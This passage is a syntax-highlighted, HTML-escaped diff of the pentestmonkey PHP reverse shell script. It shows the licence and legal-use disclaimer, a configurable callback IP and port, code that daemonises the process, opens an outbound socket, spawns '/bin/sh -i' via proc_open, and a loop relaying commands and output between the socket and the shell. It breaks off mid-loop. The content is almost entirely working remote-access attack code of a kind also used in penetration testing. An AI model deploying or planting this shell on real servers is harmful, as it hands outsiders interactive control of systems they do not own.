+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// GNU General Public License for more details.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// You should have received a copy of the GNU General Public License along
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// with this program; if not, write to the Free Software Foundation, Inc.,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This tool may be used for legal purposes only. Users take full responsibility
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// for any actions performed using this tool. If these terms are not acceptable to
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// you, then do not use this tool.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// You are encouraged to send comments, improvements or suggestions to
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// me at pentestmonkey@pentestmonkey.net
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Description
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// -----------
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This script will make an outbound TCP connection to a hardcoded IP and port.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// The recipient will be given a shell running as the current user (apache normally).
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Limitations
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// -----------
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Usage
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// -----
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">set_time_limit&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$VERSION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;1.0&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// CHANGE THIS
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">443&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// CHANGE THIS
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$chunk_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1400&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$write_a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$error_a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;uname -a; w; id; /bin/sh -i&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$daemon&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$debug&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Daemonise ourself if possible to avoid zombies later
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// our php process and avoid zombies. Worth a try...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">function_exists&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;pcntl_fork&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Fork and have the parent process exit
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nv">$pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">pcntl_fork&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$pid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Can&amp;#39;t fork&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$pid&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Parent exits
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Make the current process a session leader
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Will only succeed if we forked
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">posix_setsid&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Error: Can&amp;#39;t setsid()&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$daemon&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;WARNING: Failed to daemonise. This is quite common and not fatal.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Change to a safe directory
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">chdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Remove any umask we inherited
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">umask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Do the reverse shell...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Open reverse connection
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$sock&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">fsockopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$errno&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$errstr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">30&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">$errstr&lt;/span>&lt;span class="s2"> (&lt;/span>&lt;span class="si">$errno&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Spawn shell process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$descriptorspec&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// stdin is a pipe that the child will read from
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// stdout is a pipe that the child will write to
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// stderr is a pipe that the child will write to
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$process&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">proc_open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$descriptorspec&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$pipes&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">is_resource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$process&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Can&amp;#39;t spawn shell&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Set everything to non-blocking
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won&amp;#39;t
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">stream_set_blocking&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">stream_set_blocking&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">stream_set_blocking&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">stream_set_blocking&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Successfully opened reverse shell to &lt;/span>&lt;span class="si">$ip&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="si">$port&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Check for end of TCP connection
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">feof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Shell connection terminated&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Check for end of STDOUT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">feof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Shell process terminated&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Wait until a command is end down $sock, or some
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// command output is available on STDOUT or STDERR
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nv">$read_a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$num_changed_sockets&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">stream_select&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$read_a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$write_a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$error_a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">null&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If we can read from the TCP socket, send
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// data to process&amp;#39;s STDIN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$read_a&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SOCK READ&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SOCK: &lt;/span>&lt;span class="si">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$input&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If we can read from the process&amp;#39;s STDOUT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// send data down tcp connection
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$read_a&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;STDOUT READ&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;STDOUT: &lt;/span>&lt;span class="si">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$input&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
